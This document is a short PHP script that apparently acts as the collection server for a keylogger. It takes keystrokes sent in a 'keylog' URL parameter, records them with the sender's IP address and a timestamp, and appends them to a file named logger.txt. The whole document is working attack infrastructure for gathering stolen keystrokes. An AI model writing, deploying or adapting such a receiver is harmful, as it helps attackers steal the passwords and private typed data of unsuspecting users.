
  <?php	
  
	$ip=$_SERVER['REMOTE_ADDR'];
	
	
	$recived_keys = $_GET["keylog"];
 
	$file = fopen('logger.txt', 'a+');
	fwrite($file, date("m/d/y/H:i:s"));

	
	fwrite($file, "#". $ip. "# " .$recived_keys . "\r\n");


  ?>

